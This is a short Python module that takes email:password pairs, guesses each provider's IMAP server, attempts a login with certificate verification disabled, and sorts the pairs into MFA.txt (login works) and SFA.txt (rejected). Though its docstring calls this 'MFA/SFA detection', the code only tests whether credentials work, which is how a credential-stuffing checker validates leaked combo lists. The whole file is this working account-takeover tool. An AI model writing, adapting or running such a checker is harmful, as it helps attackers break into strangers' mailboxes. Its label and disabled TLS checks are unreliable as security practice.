"""
email_checker.py — IMAP-based MFA/SFA email access detection.
"""
import imaplib
import ssl

IMAP_SERVERS = {
    'gmail.com':     'imap.gmail.com',
    'googlemail.com':'imap.gmail.com',
    'yahoo.com':     'imap.mail.yahoo.com',
    'ymail.com':     'imap.mail.yahoo.com',
    'outlook.com':   'imap-mail.outlook.com',
    'hotmail.com':   'imap-mail.outlook.com',
    'hotmail.co.uk': 'imap-mail.outlook.com',
    'hotmail.fr':    'imap-mail.outlook.com',
    'live.com':      'imap-mail.outlook.com',
    'live.co.uk':    'imap-mail.outlook.com',
    'msn.com':       'imap-mail.outlook.com',
    'icloud.com':    'imap.mail.me.com',
    'me.com':        'imap.mail.me.com',
    'mac.com':       'imap.mail.me.com',
    'aol.com':       'imap.aol.com',
    'aim.com':       'imap.aol.com',
}


def _get_imap_host(email: str) -> str:
    domain = email.split('@')[-1].lower().strip()
    return IMAP_SERVERS.get(domain, f'imap.{domain}')


def check_email_access(
    email: str,
    password: str,
    fname: str,
    write_dedupe,
    config: dict,
) -> str:
    """
    Attempt IMAP login to determine email access level.
    Returns 'MFA' (success), 'SFA' (auth failure), or 'Unknown' (unreachable/error).
    Writes to MFA.txt or SFA.txt via write_dedupe.
    """
    if not config.get('cap_email_access', True):
        return 'Unknown'

    imap_host = _get_imap_host(email)

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        with imaplib.IMAP4_SSL(imap_host, 993, ssl_context=ctx) as imap:
            imap.login(email, password)
            write_dedupe(fname, 'MFA.txt', f'{email}:{password}\n')
            return 'MFA'

    except imaplib.IMAP4.error:
        # Authentication failure — credentials rejected by IMAP server
        write_dedupe(fname, 'SFA.txt', f'{email}:{password}\n')
        return 'SFA'

    except Exception:
        # Unreachable server, timeout, SSL error, etc.
        return 'Unknown'
